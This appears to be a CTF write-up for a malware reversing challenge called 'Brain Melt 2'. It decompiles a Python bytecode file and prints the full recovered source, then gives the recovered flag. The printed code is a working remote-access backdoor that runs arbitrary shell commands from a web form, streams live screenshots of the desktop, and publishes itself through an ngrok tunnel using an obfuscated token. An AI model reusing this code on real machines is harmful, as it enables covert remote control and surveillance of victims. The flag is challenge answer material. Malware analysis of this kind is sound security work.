## Name: Brain Melt 2
#### Category: Malware
#### Difficulty: Medium
#### Description: We'll skip Pyinstxtractor this time so it should be easy right? Note, the archive password is infected and the flag format varies slightly from the hexidecimal and length format. 

## Procedure
run ```file brain-melt-2.pyc``` command<br>

output ```brain-melt-2.pyc: Byte-compiled Python module for CPython 3.8, timestamp-based, .py timestamp: Tue May 21 21:08:49 2024 UTC, .py size: 4963 bytes```<br>

For pyc file we need to recover the python code, i always use pycdc tool for it, you can download pycdc from ```https://github.com/zrax/pycdc```, then just run ```./pycdc ~/brain-melt-2.pyc > brain.py```.<br>

### Brain-melt-2.py content
1) decrypt1, decrypt2, and decrypt3 functions are defined to decrypt various parts of a string to generate a key.<br>
2) deobfuscate function combines the results of the three decryption functions to form a key.<br>
3) ngrok_tunnel sets up an ngrok tunnel using this key.<br>
4) Desktop function takes a PIL image and prepares it to be sent as a JPEG file.<br>
5) execute function runs a shell command and flashes the output to the web interface.<br>

```
from flask import Flask, flash, request, render_template_string, send_file, redirect
from wtforms import Form, StringField, validators, SubmitField
import subprocess
import pyautogui
import io
from PIL import Image
from Crypto.Cipher import Salsa20
from pyngrok import ngrok
import base64
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

def decrypt1(encrypted_str):
    decoded_str = ''
    for i in range(0, len(encrypted_str), 2):
        encoded_chunk = encrypted_str[i:i + 2] + '=='
        decoded_str += base64.b64decode(encoded_chunk).decode('ascii')
    return decoded_str

def decrypt2(a1, a2):
    result = ''
    for character in a1:
        tempcharaddedr = 'temporary value'
        result += chr(((ord(character) - ord('a')) + a2) % 26 + ord('a'))
    return result

def decrypt3(s1, key):
    msg_nonce = s1[:8]
    ciphertext = s1[8:]
    cipher = Salsa20.new(key=key.encode('utf-8'), nonce=msg_nonce)
    return cipher.decrypt(ciphertext).decode('utf-8')

def deobfuscate():
    part1 = decrypt1('ZgbAYQZwewMAOAZQOQYwYwNQYgMA')
    part2 = decrypt2('fwvcttjsfvrshwsg', 17)
    part3 = decrypt3(b'\x97p#2\x1abw\x0f\x9a\xd1Z\x04b\x93\xa1h8]\xab\xa3\x9e7\xc9\xe8\x9b', '25dbd4f362f7d0e64b24ab231728a1fc')
    key = part1 + part2 + part3
    return key

def ngrok_tunnel():
    ngrok.set_auth_token(deobfuscate())
    http_tunnel = ngrok.connect(5000)
    print(f" * Tunnel URL: {http_tunnel.public_url}")

def Desktop(pil_img):
    img_io = io.BytesIO()
    pil_img.save(img_io, 'JPEG', quality=70)
    img_io.seek(0)
    return send_file(img_io, mimetype='image/jpeg')

def execute(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
        flash(result.stdout)
        flash(result.stderr)
    except subprocess.CalledProcessError as e:
        flash(f"Error: {e}")

class CommandForm(Form):
    command = StringField('Command:', [validators.DataRequired()])
    submit = SubmitField('Submit')

@app.route('/', methods=['GET', 'POST'])
def display():
    form = CommandForm(request.form)
    if request.method == 'POST' and form.validate():
        command = form.command.data
        execute(command)
    return render_template_string('''<!doctype html>
        <html>
        <head>
            <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
        </head>
        <body>
            <div class="container">
                <h1>Command Executor</h1>
                <form method="post">
                    <div class="form-group">
                        <label for="command">Command:</label>
                        <input type="text" class="form-control" id="command" name="command">
                    </div>
                    <button type="submit" class="btn btn-success">Submit</button>
                </form>
                {% for message in get_flashed_messages() %}
                <div class="alert alert-info">{{ message }}</div>
                {% endfor %}
                <img src="/images/desktop.jpg" id="img" width="100%" style="height: 100vh;">
            </div>
            <script type="text/javascript">
                window.onload = function() {
                    var image = document.getElementById("img");
                    function updateImage() {
                        image.src = image.src.split("?")[0] + "?" + new Date().getTime();
                    }
                    setInterval(updateImage, 1000);
                }
            </script>
        </body>
        </html>''', form=form)

@app.route('/images/desktop.jpg')
def serve_img():
    screenshot = pyautogui.screenshot()
    return Desktop(screenshot)

if __name__ == '__main__':
    glob_key = '24a0b299984ee8da7aae14b7163e2e63'
    ngrok_tunnel()
    app.run(host='0.0.0.0', debug=False)

```
<br>

then we can emulate the code, and it will return us the flag

<img width="874" alt="Screenshot 2024-05-26 at 00 17 23" src="https://github.com/sp34rh34d/CTF-writeups/assets/94752464/377ba6f8-cd8d-4a9a-8dbd-0cf37f348ac1">

flag ```flag{08e9cc5b0wnmtkkajwmijynjx3a415bd9a8024930}```
